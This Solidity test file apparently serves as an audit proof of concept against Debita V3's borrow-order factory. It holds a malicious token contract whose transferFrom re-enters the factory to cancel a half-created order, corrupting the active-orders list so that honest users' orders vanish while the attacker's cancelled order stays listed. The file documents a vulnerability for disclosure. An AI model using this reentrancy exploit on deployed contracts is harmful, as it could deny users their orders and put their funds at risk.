pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {veNFTAerodrome} from "@contracts/Non-Fungible-Receipts/veNFTS/Aerodrome/Receipt-veNFT.sol";
import {DBOFactory} from "@contracts/DebitaBorrowOffer-Factory.sol";
import {DBOImplementation} from "@contracts/DebitaBorrowOffer-Implementation.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {DynamicData} from "./interfaces/getDynamicData.sol";
import {VotingEscrow} from "@aerodrome/VotingEscrow.sol";
// import ERC20
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
import {DebitaV3Loan} from "@contracts/DebitaV3Loan.sol";
import {DebitaIncentives} from "@contracts/DebitaIncentives.sol";

contract AttackerContract is ERC20Mock {
    address myBorrowOrder;
    bool shouldCallCancelOnBorrowOrder = false;

    function createSelfOrder(address orderFactory) public {
        _mint(address(this), 1000e18);
        _approve(address(this), orderFactory, type(uint256).max);

        // need to compute Create1 address from nonce. use try catch for simplicity. Testing only
        try AttackerContract(address(this)).createFakeOrderAndRevert(orderFactory) {}
        catch Error(string memory reason) {
            console.log("Fake order revert and got Create1 address");
            console.log(reason);
            myBorrowOrder = Strings.parseAddress(reason);
            console.log("Create1 address", myBorrowOrder);
        }

        console.log("before reentrancy");
        shouldCallCancelOnBorrowOrder = true;
        address borrowOrder = DBOFactory(orderFactory).createBorrowOrder(
            new bool[](1),
            new uint256[](1),
            1000,
            864000,
            new address[](1),
            address(this),
            false,
            0,
            new address[](1),
            new uint256[](1),
            address(0),
            1000 //@amount of token send to factory
        );
        console.log("after reentrancy", borrowOrder);
    }

    function createFakeOrderAndRevert(address orderFactory) public {
        address borrowOrder = DBOFactory(orderFactory).createBorrowOrder(
            new bool[](1),
            new uint256[](1),
            1000,
            864000,
            new address[](1),
            address(this),
            false,
            0,
            new address[](1),
            new uint256[](1),
            address(0),
            1000 //@amount of token send to factory
        );
        console.log("Revert point", borrowOrder);
        revert(Strings.toHexString(borrowOrder));
    }

    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
        ERC20.transferFrom(from, to, value);
        if (shouldCallCancelOnBorrowOrder) {
            console.log("reentrancy point. Call cancel() on: ", myBorrowOrder);
            DBOImplementation(myBorrowOrder).cancelOffer();
            shouldCallCancelOnBorrowOrder = false;
            //also mint more token to borrow order contract to bypass balance check right after.
            _mint(myBorrowOrder, 1000e18);
        }
        return true;
    }
}

contract DebugTest is Test {
    VotingEscrow public ABIERC721Contract;
    veNFTAerodrome public receiptContract;

    DBOFactory public DBOFactoryContract;
    ERC20Mock public AEROContract;
    ERC20Mock public USDCContract;
    // DBOImplementation public BorrowOrder;

    DynamicData public allDynamicData;
    address DebitaChainlinkOracle;
    address DebitaPythOracle;

    address veAERO = 0xeBf418Fe2512e7E6bd9b87a8F0f294aCDC67e6B4;
    address AERO = 0x940181a94A35A4569E4529A3CDfB74e38FD98631;
    address USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;
    address AEROFEED = 0x4EC5970fC728C5f65ba413992CD5fF6FD70fcfF0;
    address borrower = address(0x222222);
    address lender = address(0x033333);

    function setUp() public {
        receiptContract = new veNFTAerodrome(veAERO, AERO);
        ABIERC721Contract = VotingEscrow(veAERO);

        DBOImplementation borrowOrderImplementation = new DBOImplementation();
        DBOFactoryContract = new DBOFactory(address(borrowOrderImplementation));
        allDynamicData = new DynamicData();
        AEROContract = ERC20Mock(AERO);
        USDCContract = ERC20Mock(USDC);

        deal(AERO, lender, 1000e18, false);
        deal(AERO, lender, 1000e18, false);
        deal(AERO, borrower, 1000e18, false);
        deal(USDC, borrower, 10000e18, false);

        vm.startPrank(borrower);
        IERC20(AERO).approve(address(ABIERC721Contract), 100e18);
        uint256 id = ABIERC721Contract.createLock(10e18, 365 * 4 * 86400);
        ABIERC721Contract.approve(address(receiptContract), id);
        uint256[] memory nftID = allDynamicData.getDynamicUintArray(1);
        nftID[0] = id;
        receiptContract.deposit(nftID);
        uint256 receiptID = receiptContract.lastReceiptID();
        IERC20(AERO).approve(address(DBOFactoryContract), 100e18);
        receiptContract.approve(address(DBOFactoryContract), receiptID);

        //@ copy from other test
        _createBorrowOrder(
            true, 5000, 1400, 864000, AERO, address(receiptContract), true, receiptID, 0, DebitaChainlinkOracle, 1
        );
        IERC20(USDC).approve(address(DBOFactoryContract), 10000e18);
        // create 2nd,3rd borrow order with USDC as collateral
        _createBorrowOrder(
            true, 5000, 1400, 864000, AERO,USDC , false, 0, 0, DebitaChainlinkOracle, 3000e18
        );
        _createBorrowOrder(
            true, 5000, 1400, 864000, AERO,USDC, false, 0, 0, DebitaChainlinkOracle, 2000e18
        );
        vm.stopPrank();
    }

    function testDebug1() public {
        // Query list of active borrow orders. Show normal NFT order
        DBOImplementation.BorrowInfo[] memory list = DBOFactoryContract.getActiveBorrowOrders(0, 100);
        for (uint256 i = 0; i < list.length; i++) {
            console.log("Borrow order index: %s, owner: %s", i, list[i].owner);
        }
        assertEq(list[0].isNFT, true);

        address attacker = address(0xcafe);
        vm.startPrank(attacker);
        AttackerContract attackerContract = new AttackerContract();
        // call 3 times to repeatedly delete first order at index 0
        for (uint256 i = 0; i < list.length; i++) {
            attackerContract.createSelfOrder(address(DBOFactoryContract));
        }
        vm.stopPrank();

        // Query list of active borrow orders again. Now with one active order but no NFT order.
        // Attacker with cancelled active order still in the list. While other user lost their order
        DBOImplementation.BorrowInfo[] memory newList = DBOFactoryContract.getActiveBorrowOrders(0, 100);
        for (uint256 i = 0; i < newList.length; i++) {
            console.log("Borrow order index: %s, owner: %s", i, newList[i].owner);
        }
        //notice that new list missing 1st order which was still active. while attacker order become active despite already cancelled
        assertEq(newList.length, 3);
        console.log("Failed Test: 1st order should be NFT as shown in setup. But the test failed because order index 0 is deleted.");
        //@failed test
        assertEq(newList[0].isNFT, true);
    }
    function testDebug2() public {
        // Query list of active borrow orders. Show normal NFT order
        DBOImplementation.BorrowInfo[] memory list = DBOFactoryContract.getActiveBorrowOrders(0, 100);
        for (uint256 i = 0; i < list.length; i++) {
            console.log("Borrow order index: %s, owner: %s", i, list[i].owner);
        }
        assertEq(list[0].isNFT, true);

        address attacker = address(0xcafe);
        vm.startPrank(attacker);
        AttackerContract attackerContract = new AttackerContract();
        // call 3 times to repeatedly delete first order at index 0
        for (uint256 i = 0; i < list.length; i++) {
            attackerContract.createSelfOrder(address(DBOFactoryContract));
        }
        vm.stopPrank();
        
        //@previous user try to cancel their own order to withdraw funds.
        vm.startPrank(borrower);
        for(uint256 i = 0; i < list.length; i++) {
            DBOImplementation(list[i].borrowOrderAddress).cancelOffer();
        }
        vm.stopPrank();
    }

    function _createBorrowOrder(
        bool _oracleActivated,
        uint256 _ltv,
        uint256 _maxInterestRate,
        uint256 _duration,
        address _principle,
        address _collateral,
        bool _isNFT,
        uint256 _receiptId,
        uint256 _ratio,
        address _oraclePrinciple,
        uint256 _amount
    ) internal {
        bool[] memory oraclesActivated = allDynamicData.getDynamicBoolArray(1);
        uint256[] memory ltvs = allDynamicData.getDynamicUintArray(1);
        uint256[] memory ratio = allDynamicData.getDynamicUintArray(1);

        address[] memory acceptedPrinciples = allDynamicData.getDynamicAddressArray(1);
        address[] memory acceptedCollaterals = allDynamicData.getDynamicAddressArray(1);
        address[] memory oraclesPrinciples = allDynamicData.getDynamicAddressArray(1);

        oraclesPrinciples[0] = _oraclePrinciple;
        acceptedPrinciples[0] = _principle;
        acceptedCollaterals[0] = _collateral;
        oraclesActivated[0] = _oracleActivated;
        ltvs[0] = _ltv;
        ratio[0] = _ratio;
        if(_isNFT)
            receiptContract.approve(address(DBOFactoryContract), _receiptId);
        address borrowOrderAddress = DBOFactoryContract.createBorrowOrder(
            oraclesActivated,
            ltvs,
            _maxInterestRate,
            _duration,
            acceptedPrinciples,
            _collateral,
            _isNFT,
            _receiptId,
            oraclesPrinciples,
            ratio,
            _oraclePrinciple,
            _amount
        );
    }
}
